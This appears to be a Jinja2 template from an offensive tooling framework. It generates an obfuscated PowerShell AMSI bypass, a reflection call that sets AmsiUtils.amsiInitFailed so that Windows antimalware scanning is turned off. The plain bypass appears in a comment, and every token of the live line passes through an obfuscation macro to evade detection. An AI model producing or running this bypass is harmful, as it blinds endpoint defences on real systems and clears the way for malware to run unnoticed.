{% from 'macros.jinja2' import obfuscate with context%}

{# [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true) #}
[Ref].{{obfuscate("Assembly")}}.{{obfuscate("GetType")}}({{obfuscate("System.Management.Automation.AmsiUtils")}}).{{obfuscate("GetField")}}({{obfuscate("amsiInitFailed")}},{{obfuscate("NonPublic,Static")}}).{{obfuscate("SetValue")}}($null,$true)
